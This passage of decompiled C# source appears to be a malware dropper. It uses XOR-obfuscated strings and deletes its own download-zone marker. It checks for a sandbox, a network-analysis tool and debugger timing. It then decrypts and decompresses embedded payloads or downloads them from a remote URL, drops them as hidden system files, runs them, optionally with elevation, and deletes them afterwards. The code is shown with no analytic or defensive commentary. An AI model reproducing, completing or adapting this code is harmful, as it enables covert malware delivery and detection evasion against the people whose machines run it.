				100, 154, 65, 159, 222, 131, 248, 126, 57, 54,
				11, 191, 237, 77, 181, 213, 55, 203, 137, 83,
				9, 235, 80, 140, 253, 1, 143, 71, 238, 179,
				222, 89, 223, 252, 252, 194, 72, 178, 174, 184,
				144, 183, 146, 83, 100, 254, 47, 170
			}
		}
	};

	private static void Main()
	{
		//IL_028a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0291: Unknown result type (might be due to invalid IL or missing references)
		//IL_0296: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			DeleteFile(Assembly.GetExecutingAssembly().Location + smethod_3("\u0081»Ûîïä\u00afÈåäïõèçèäó"));
		}
		catch
		{
		}
		bool flag = GetModuleHandle(smethod_3("Á\u0092£\u00a8¤\u0085\u00ad\u00ad")) != IntPtr.Zero;
		bool flag2 = Process.GetProcessesByName(smethod_3("\u000fXf}j|gn}d")).Length > 0 || Process.GetProcesses().Any(delegate(Process process)
		{
			try
			{
				return string.Compare(process.MainWindowTitle, smethod_3("à\u00b4\u0088\u0085À·\u0089\u0092\u0085\u0093\u0088\u0081\u0092\u008bÀ®\u0085\u0094\u0097\u008f\u0092\u008bÀ¡\u008e\u0081\u008c\u0099\u009a\u0085\u0092"), ignoreCase: true) == 0;
			}
			catch
			{
				return false;
			}
		});
		bool flag3 = Process.GetProcesses().Any(delegate(Process process)
		{
			try
			{
				return process.MainWindowTitle.ToLower().Contains(smethod_3("C31, &00c.,-*7,1cn"));
			}
			catch
			{
				return false;
			}
		});
		int tickCount = Environment.TickCount;
		DateTime now = DateTime.Now;
		Thread.Sleep(500);
		int tickCount2 = Environment.TickCount;
		DateTime now2 = DateTime.Now;
		bool flag4 = tickCount2 - tickCount < 450 || now2 - now < TimeSpan.FromMilliseconds(450.0);
		object[] array = object_0;
		foreach (object obj2 in array)
		{
			try
			{
				if (obj2 is Class1)
				{
					Class1 @class = (Class1)obj2;
					if ((!@class.bool_4 || !flag) && (!@class.bool_5 || !flag2) && (!@class.bool_6 || !flag3) && (!@class.bool_7 || !flag4))
					{
						byte[] byte_ = @class.byte_0;
						if (@class.bool_1)
						{
							byte_ = smethod_2(byte_);
						}
						if (@class.bool_0)
						{
							byte_ = smethod_1(byte_);
						}
						smethod_0(@class.string_0, @class.bool_2, @class.int_0, @class.int_1, @class.bool_3, @class.string_1, byte_);
					}
				}
				else if (obj2 is Class2)
				{
					Class2 class2 = (Class2)obj2;
					if ((!class2.bool_2 || !flag) && (!class2.bool_3 || !flag2) && (!class2.bool_4 || !flag3) && (!class2.bool_5 || !flag4))
					{
						smethod_0(class2.string_1, class2.bool_0, class2.int_0, class2.int_1, class2.bool_1, class2.string_2, new WebClient().DownloadData(class2.string_0));
					}
				}
				else if (obj2 is Class3)
				{
					Class3 class3 = (Class3)obj2;
					MessageBox.Show(class3.string_1, class3.string_0, class3.messageBoxButtons_0, class3.messageBoxIcon_0);
				}
			}
			catch
			{
			}
		}
	}

	private static void smethod_0(string string_0, bool bool_0, int int_0, int int_1, bool bool_1, string string_1, byte[] byte_0)
	{
		string path;
		switch (int_0)
		{
		default:
			return;
		case 1:
			path = Path.GetTempPath();
			break;
		case 2:
			path = Registry.GetValue(smethod_3("\u0001IJDX^BTSSDOU^TRDS]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Dyqmnsds]Ridmm!Gnmedsr"), smethod_3("½Æ\u008e\u008a\u0089ùø\u008f\u0084\u008d\u0090\u008c\u008f\u008eû\u0090\u0089\u0088\u008b\u0088\u0090\u0084\u008c\u008b\u0089\u0090\u008e\u0084þ\u0089\u0084\u008f\u0088ø\u0089\u008b\u008aÿÀ"), null) as string;
			break;
		case 3:
			path = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
			break;
		case 4:
			path = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			break;
		case 5:
			path = AppDomain.CurrentDomain.BaseDirectory;
			break;
		}
		string_0 = Path.Combine(path, string_0);
		File.Delete(string_0);
		File.WriteAllBytes(string_0, byte_0);
		if (bool_0)
		{
			new FileInfo(string_0).Attributes |= FileAttributes.Hidden | FileAttributes.System;
		}
		if (int_1 < 1)
		{
			return;
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0, string_1);
		if (bool_1)
		{
			processStartInfo.Verb = smethod_3("«ÙÞÅÊØ");
		}
		Process process = null;
		try
		{
			process = Process.Start(processStartInfo);
		}
		catch
		{
		}
		if (int_1 >= 2)
		{
			process?.WaitForExit();
			if (int_1 >= 3)
			{
				File.Delete(string_0);
			}
		}
	}

	private static byte[] smethod_1(byte[] byte_0)
	{
		MemoryStream memoryStream = new MemoryStream();
		int num = BitConverter.ToInt32(byte_0, 0);
		memoryStream.Write(byte_0, 4, byte_0.Length - 4);
		byte[] array = new byte[num];
		memoryStream.Position = 0L;
		new GZipStream(memoryStream, CompressionMode.Decompress).Read(array, 0, array.Length);
		return array;
	}

	private static byte[] smethod_2(byte[] byte_0)
	{
		byte[] array = new byte[16];
		Buffer.BlockCopy(byte_0, 0, array, 0, 16);
		Rijndael rijndael = Rijndael.Create();
		byte[] array4 = (rijndael.IV = (rijndael.Key = array));
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
		cryptoStream.Write(byte_0, 16, byte_0.Length - 16);
		cryptoStream.Close();
		return memoryStream.ToArray();
	}

	private static string smethod_3(string string_0)
	{
		return new string((from c in string_0.Substring(1)
			select (char)(c ^ (byte)string_0[0])).ToArray());
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool DeleteFile(string string_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string string_0);
}
